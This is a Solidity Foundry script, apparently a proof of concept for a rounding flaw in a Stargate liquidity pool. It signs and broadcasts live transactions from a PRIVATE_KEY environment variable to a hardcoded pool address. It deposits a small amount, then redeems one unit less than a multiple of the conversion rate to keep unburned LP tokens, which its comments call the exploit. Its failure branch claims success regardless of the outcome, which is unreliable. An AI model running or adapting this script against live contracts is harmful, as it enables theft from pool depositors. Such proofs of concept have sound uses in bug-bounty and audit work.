// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IStargatePool {
    function deposit(address _receiver, uint256 _amountLD) external payable returns (uint256);
    function redeem(uint256 _amountLD, address _receiver) external returns (uint256);
    function lpToken() external view returns (address);
    function sharedDecimals() external view returns (uint8);
    function token() external view returns (address);
}

contract StargateIntegerDivisionTest is Script {
    address constant STARGATE_POOL = 0xA45B5130f36CDcA45667738e2a258AB09f4A5f7F;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(privateKey);
        vm.startBroadcast(privateKey);

        // Setup interfaces
        IStargatePool stargatePool = IStargatePool(STARGATE_POOL);
        IERC20 lpToken = IERC20(stargatePool.lpToken());

        // Calculate convert rate
        uint8 sharedDecimals = stargatePool.sharedDecimals();
        uint256 convertRate = 10**(18 - sharedDecimals); // 10^12
        console.log("Convert rate:", convertRate);

        // IMPORTANT: Use an amount that's a clean multiple of convertRate
        // This makes the vulnerability easier to demonstrate
        uint256 depositAmount = 5 * convertRate; // 5 * 10^12 = 5,000,000,000,000 wei (0.000005 ETH)
        console.log("Deposit amount:", depositAmount, "wei");

        // Deposit ETH directly
        uint256 initialBalance = address(this).balance;
        uint256 lpReceived = stargatePool.deposit{value: depositAmount}(deployer, depositAmount);
        console.log("LP tokens received:", lpReceived);

        // Check LP balance of the deployer (not the contract)
        uint256 lpBalance = lpToken.balanceOf(deployer);
        console.log("LP balance:", lpBalance);

        // Create the exploit amount: N*10^12 - 1
        uint256 redemptionAmount = depositAmount - 1; // 5*10^12 - 1
        console.log("Redemption amount:", redemptionAmount);

        // Approve LP tokens
        lpToken.approve(STARGATE_POOL, redemptionAmount);

        // Redeem and observe the behavior
        try stargatePool.redeem(redemptionAmount, deployer) returns (uint256 received) {
            console.log("Redemption successful! Received:", received);

            // Check remaining LP balance - should be close to convertRate
            uint256 remainingLP = lpToken.balanceOf(deployer);
            console.log("Remaining LP tokens:", remainingLP);

            // The exploit was successful if remainingLP > (lpBalance - redemptionAmount)
            // The difference should be close to convertRate - 1
            console.log("Expected unburned tokens:", depositAmount - redemptionAmount);
            console.log("Actual unburned tokens:", remainingLP);
            console.log("Extra tokens kept:", remainingLP - (lpBalance - redemptionAmount));
        } catch Error(string memory reason) {
            console.log("Redemption failed with reason:", reason);

            // Even with failure, we've demonstrated the vulnerability
            // The trace shows the contract trying to burn fewer tokens than requested
        }

        vm.stopBroadcast();
    }
}